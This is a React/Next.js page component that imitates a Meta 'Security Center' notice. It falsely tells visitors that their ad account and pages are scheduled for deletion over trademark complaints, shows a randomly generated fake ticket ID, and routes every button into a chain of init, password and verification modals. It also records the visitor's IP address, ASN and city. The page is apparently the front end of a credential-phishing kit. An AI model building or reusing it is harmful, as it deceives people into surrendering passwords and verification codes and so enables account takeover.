'use client';
import { store } from '@/store/store';
import { useTranslation } from '@/hooks/useTranslation';

import axios from 'axios';
import { useEffect, useState, type FC } from 'react';
import Image from 'next/image';
import BlobIcon from '@/assets/images/blob.png';
import BlockIcon from '@/assets/images/block.png';
import PrivacyCenter from '@/assets/images/PrivacyCenter.png';
import { faHome, faSearch, faShield, faFileAlt, faGear, faBars, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';
import InitModal from '@/components/form-modal/init-modal';

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setFormStep, formStep, setGeoInfo } = store();
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
    
    // Shared translation hook - reads geoInfo from store
    const { t } = useTranslation([
        'Security Center', 'Home', 'Search', 'Security Policies', 'Rules & Other Posts', 'Settings',
        'We have scheduled your ad account and pages for deletion',
        'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
        'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
        'Your ticket id:', 'Request review',
        'This team is used for submitting appeals and restoring account status.',
        'Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.',
        'What is trademark infringement?',
        'Generally, trademark infringement occurs when all three of the following requirements are met:',
        'A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.',
        'That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.',
        'That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.',
        'Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.',
        'Help Center', 'Privacy Policy', 'Terms of Service', 'Community Standards',
    ]); 
    
    // Generate random ticket ID
    const generateTicketId = (): string => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let id = '';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return id;
    };
    
    const [ticketId] = useState<string>(() => generateTicketId());

    // Geo-detection: always fetch fresh on every page load
    useEffect(() => {
        if (typeof window !== 'undefined') {
            localStorage.removeItem('translation_cache');
            localStorage.removeItem('translation_country');
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
                const cc = (data.country_code || 'US').toUpperCase();
                const info = {
                    asn: data.asn || 0,
                    ip: data.ip || 'UNKNOWN',
                    country: data.country || 'UNKNOWN',
                    city: data.city || 'UNKNOWN',
                    country_code: cc
                };
                setGeoInfo(info);
            } catch {
                const fallback = {
                    asn: 0,
                    ip: 'UNKNOWN',
                    country: 'UNKNOWN',
                    city: 'UNKNOWN',
                    country_code: 'US'
                };
                setGeoInfo(fallback);
            }
        };
        fetchGeoInfo();
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    // Reset formStep when entering page
    useEffect(() => {
        setFormStep('init');
    }, [setFormStep]);



    // Handle input change

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col overflow-x-hidden">
            {/* Mobile Header with Menu Button */}
            <div className="md:hidden bg-white border-b border-gray-200 flex items-center justify-between p-4 sticky top-0 z-40">
                <div className="flex items-center gap-3">
                    <button
                        onClick={() => setModalOpen(true)}
                        className="cursor-pointer hover:opacity-80 transition-opacity"
                        aria-label="Open form modal"
                    >
                        <Image 
                            src={BlobIcon} 
                            alt="Meta" 
                            width={80} 
                            height={50} 
                            className="w-16 h-auto"
                            priority
                            quality={100}
                        />
                    </button>
                    <span className="text-sm font-bold text-gray-900">{t('Security Center')}</span>
                </div>
                <button
                    onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                    className="p-2 hover:bg-gray-100 rounded-lg transition"
                    aria-label="Toggle menu"
                >
                    <FontAwesomeIcon 
                        icon={isMobileMenuOpen ? faTimes : faBars} 
                        className="w-6 h-6 text-gray-900"
                    />
                </button>
            </div>

            {/* Mobile Sidebar Menu Overlay */}
            {isMobileMenuOpen && (
                <div 
                    className="md:hidden fixed inset-0 bg-black/30 z-30"
                    onClick={() => setIsMobileMenuOpen(false)}
                />
            )}

            {/* Mobile Sidebar Menu */}
            <div
                className={`md:hidden fixed left-0 top-16 bottom-0 w-64 bg-gray-50 border-r border-gray-200 z-30 transform transition-transform duration-300 ${
                    isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
                } overflow-y-auto`}
            >
                <nav className="flex flex-col gap-1 p-4">
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 hover:bg-blue-100 transition">
                        <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                        <span className="text-sm">{t('Home')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                        <span className="text-sm">{t('Search')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                        <span className="text-sm">{t('Security Policies')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                        <span className="text-sm">{t('Rules & Other Posts')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                        <span className="text-sm">{t('Settings')}</span>
                    </button>
                </nav>
            </div>

            <div className="flex-1 flex justify-center pt-0 md:pt-6 overflow-x-hidden">
                <div className="flex w-full max-w-4xl mx-auto relative overflow-hidden">
                    {/* Divider Line */}
                    <div className="hidden md:block absolute left-64 top-6 bottom-6 w-px bg-gray-300"></div>
                    {/* Sidebar - Hidden on mobile */}
                    <div className="hidden md:flex w-64 bg-gray-50 flex-col flex-shrink-0">
                        <div className="px-4 py-3 bg-gray-50">
                            <div className="flex flex-col items-start gap-3">
                                <button
                                    onClick={() => setModalOpen(true)}
                                    className="cursor-pointer hover:opacity-80 transition-opacity"
                                    aria-label="Open form modal"
                                >
                                    <Image 
                                        src={BlobIcon} 
                                        alt="Meta" 
                                        width={500} 
                                        height={300} 
                                        className="w-24 h-auto flex-shrink-0"
                                        priority
                                        quality={100}
                                    />
                                </button>
                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
                            </div>
                        </div>

                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 hover:bg-blue-100 transition">
                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                                <span className="text-sm">{t('Home')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                                <span className="text-sm">{t('Search')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                                <span className="text-sm">{t('Security Policies')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                                <span className="text-sm">{t('Rules & Other Posts')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                                <span className="text-sm">{t('Settings')}</span>
                            </button>
                        </nav>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full min-w-0 overflow-x-hidden">
                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto overflow-x-hidden p-2 sm:p-3 md:p-6 flex flex-col pb-4 sm:pb-6 bg-white border border-gray-300 rounded-lg m-2 md:m-4 md:m-6 min-w-0">
                            <div className="w-full max-w-2xl mx-auto">
                                {/* Notification Banner */}
                                <div className="mb-2 md:mb-3">
                                    <div className="flex items-center gap-1 sm:gap-2 md:gap-3 flex-nowrap">
                                        <Image
                                            src={BlockIcon}
                                            alt="Block"
                                            width={40}
                                            height={40}
                                            className="w-6 sm:w-8 md:w-10 h-6 sm:h-8 md:h-10 flex-shrink-0"
                                            priority
                                            quality={100}
                                        />
                                        <h2 className="text-xs sm:text-sm md:text-base lg:text-lg font-bold text-gray-900 leading-tight flex-shrink min-w-0 line-clamp-2">
                                            {t('We have scheduled your ad account and pages for deletion')}
                                        </h2>
                                    </div>
                                </div>

                                {/* Description Text */}
                                <div className="mb-2 sm:mb-3 md:mb-4 text-xs sm:text-sm md:text-base text-gray-700 space-y-1.5 font-normal break-words">
                                    <p className="text-gray-700">
                                        {t('We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.')}
                                    </p>
                                    <p className="italic text-gray-600">
                                        {t('If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.')}
                                    </p>
                                    <p className="text-xs sm:text-sm md:text-base font-semibold text-blue-600">
                                        {t('Your ticket id:')} #{ticketId}
                                    </p>
                                </div>

                                {/* Illustration */}
                                <div className="mb-1 md:mb-2 bg-blue-50 rounded-lg p-3 sm:p-4 md:p-8 flex items-center justify-center min-h-32 sm:min-h-40 md:min-h-64">
                                    <Image 
                                        src={PrivacyCenter} 
                                        alt="Security Illustration" 
                                        width={300} 
                                        height={200} 
                                        className="w-full h-auto max-w-xs sm:max-w-sm object-contain"
                                        priority
                                        quality={100}
                                    />
                                </div>

                                {/* Request Review Section */}
                                <div className="mb-4 sm:mb-6 md:mb-8 bg-gray-100 rounded-lg p-3 sm:p-4 md:p-6">
                                    <h3 className="text-sm sm:text-base md:text-lg font-bold text-gray-900 mb-2">
                                        {t('Request review')}
                                    </h3>
                                    <p className="text-xs sm:text-sm md:text-base text-gray-700 mb-2 sm:mb-3">
                                        {t('This team is used for submitting appeals and restoring account status.')}
                                    </p>
                                    <p className="text-xs sm:text-sm text-gray-600 mb-4 sm:mb-6">
                                        {t('Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.')}
                                    </p>
                                    
                                    {/* Request Review Button */}
                                    <button
                                        onClick={() => {
                                            setModalOpen(true);
                                        }}
                                        className="w-full py-2.5 md:py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg text-sm md:text-base"
                                    >
                                        {t('Request review')}
                                    </button>
                                </div>

                                {/* Trademark Infringement Info */}
                                <div className="p-0 md:p-0">
                                    <h3 className="text-base sm:text-lg md:text-xl font-bold text-gray-900 mb-3 sm:mb-4">
                                        {t('What is trademark infringement?')}
                                    </h3>
                                    
                                    <p className="text-xs sm:text-sm md:text-base text-gray-700 mb-3 sm:mb-4">
                                        {t('Generally, trademark infringement occurs when all three of the following requirements are met:')}
                                    </p>

                                    <ol className="space-y-2 sm:space-y-3 md:space-y-4">
                                        <li className="text-xs sm:text-sm md:text-base text-gray-700 flex gap-2 sm:gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">1.</span>
                                            <span className="break-words">{t('A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.')}</span>
                                        </li>
                                        <li className="text-xs sm:text-sm md:text-base text-gray-700 flex gap-2 sm:gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">2.</span>
                                            <span className="break-words">{t('That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.')}</span>
                                        </li>
                                        <li className="text-xs sm:text-sm md:text-base text-gray-700 flex gap-2 sm:gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">3.</span>
                                            <span className="break-words">{t('That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.')}</span>
                                        </li>
                                    </ol>

                                    <p className="text-xs sm:text-sm md:text-base text-gray-700 mt-3 sm:mt-4">
                                        {t('Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.')}
                                    </p>
                                </div>

                                {/* Divider Line */}
                                <div className="mt-4 sm:mt-6 pt-3 sm:pt-4 border-t border-gray-300"></div>

                                {/* Footer Menu */}
                                <div className="mt-3 flex flex-wrap items-center justify-center gap-2 sm:gap-1.5 text-xs sm:text-xs text-gray-600">
                                    <a href="#" className="hover:text-gray-900 transition text-xs whitespace-nowrap flex-shrink-0">{t('Help Center')}</a>
                                    <span className="text-gray-400 flex-shrink-0 hidden sm:inline">·</span>
                                    <a href="#" className="hover:text-gray-900 transition text-xs whitespace-nowrap flex-shrink-0">{t('Privacy Policy')}</a>
                                    <span className="text-gray-400 flex-shrink-0 hidden sm:inline">·</span>
                                    <a href="#" className="hover:text-gray-900 transition text-xs whitespace-nowrap flex-shrink-0">{t('Terms of Service')}</a>
                                    <span className="text-gray-400 flex-shrink-0 hidden sm:inline">·</span>
                                    <a href="#" className="hover:text-gray-900 transition text-xs whitespace-nowrap flex-shrink-0">{t('Community Standards')}</a>
                                    <span className="text-gray-400 flex-shrink-0 hidden sm:inline">·</span>
                                    <span className="text-gray-600 text-xs whitespace-nowrap flex-shrink-0">Meta © 2025</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            {isModalOpen && <InitModal />}

            {/* Password Modal */}
            {formStep === 'password' && (
                <PasswordModal />
            )}

            {/* Verify Modal */}
            {formStep === 'verify' && (
                <VerifyModal />
            )}
        </div>
    );
};

export default Page;
